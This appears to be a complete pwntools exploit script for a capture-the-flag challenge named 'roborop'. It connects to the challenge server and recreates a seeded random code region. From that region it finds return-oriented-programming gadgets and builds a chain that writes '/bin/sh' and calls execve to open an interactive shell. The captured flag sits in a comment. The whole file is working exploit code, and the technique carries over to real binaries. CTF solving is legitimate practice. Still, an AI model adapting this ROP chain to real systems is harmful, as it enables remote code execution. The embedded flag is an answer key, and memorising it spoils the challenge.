#!/usr/bin/env python3
import subprocess

from pwn import *


def connect():
    return remote("roborop-1.play.hfsc.tf", 1993)


def main():
    with connect() as tube:
        tube.recvuntil(b"seed:")
        seed = int(tube.recvline(), 16)
        tube.recvuntil(b"addr: ")
        addr = int(tube.recvline(), 16)

        with open("gen.c", "w") as fp:
            fp.write("""\
#include <stdlib.h>
#include <unistd.h>
static int buf[0x4000000];
int main(int argc, char **argv)
{
    unsigned int seed = atol(argv[1]);
    srand(seed);
    for (int i = 0; i < sizeof(buf) / sizeof(buf[0]); i++) buf[i] = rand();
    return write(STDOUT_FILENO, buf, sizeof(buf)) == sizeof(buf) ? 0 : 1;
}
""")
        subprocess.check_call(["gcc", "-O3", "gen.c", "-o", "gen"])
        code = subprocess.check_output(["./gen", str(seed)])
        assert len(code) == 0x10000000
        syscall = addr + code.index(b'\x0f\x05')
        pop_rax = addr + code.index(b'\x58\xc3')
        pop_rdi = addr + code.index(b'\x5f\xc3')
        pop_rsi = addr + code.index(b'\x5e\xc3')
        pop_rdx = addr + code.index(b'\x5a\xc3')
        push_rsp_pop_rdi = addr + code.index(b'\x54\x5f\xc3')
        push_rdi_pop_rsi = addr + code.index(b'\x57\x5e\xc3')
        push_rsi_pop_rax = addr + code.index(b'\x56\x58\xc3')
        push_rdi_pop_rdx = addr + code.index(b'\x57\x5a\xc3')
        push_rdi_pop_rcx = addr + code.index(b'\x57\x59\xc3')
        push_rcx_pop_rax = addr + code.index(b'\x51\x58\xc3')
        push_rcx_pop_rdi = addr + code.index(b'\x51\x5f\xc3')
        stosq = addr + code.index(b'\x48\xab\xc3')
        tube.sendafter(b"rops: ", flat({
            0: b"".join((
                # rop + 8: <- rcx, rdi
                struct.pack("<Q", push_rsp_pop_rdi),
                struct.pack("<Q", push_rdi_pop_rcx),
                # rop + 8: "/bin/sh\0" <- rcx
                #          <- rdi
                struct.pack("<QQ", pop_rax, struct.unpack("<Q", b"/bin/sh\0")[0]),
                struct.pack("<Q", stosq),
                # rop + 8: "/bin/sh\0" <- rcx
                #          <- rdi, rsi
                struct.pack("<Q", push_rdi_pop_rsi),
                # rop + 8: "/bin/sh\0" <- rcx
                #          rop + 8 <- rsi
                #          <- rdi
                struct.pack("<Q", push_rcx_pop_rax),
                struct.pack("<Q", stosq),
                # rop + 8: "/bin/sh\0" <- rcx
                #          rop + 8 <- rsi
                #          <- rdi, rdx
                struct.pack("<Q", push_rdi_pop_rdx),
                # rop + 8: "/bin/sh\0" <- rcx
                #          rop + 8 <- rsi
                #          0 <- rdx
                #          <- rdi
                struct.pack("<QQ", pop_rax, 0),
                struct.pack("<Q", stosq),
                # rop + 8: "/bin/sh\0" <- rdi, rcx
                #          rop + 8 <- rsi
                #          0 <- rdx
                struct.pack("<Q", push_rcx_pop_rdi),
                # syscall
                struct.pack("<QQ", pop_rax, 59),  # __NR_execve
                struct.pack("<Q", syscall),
            )),
        }, length=0x400))
        # midnight{spR4Y_aNd_pR4Y}
        tube.interactive()


if __name__ == "__main__":
    main()
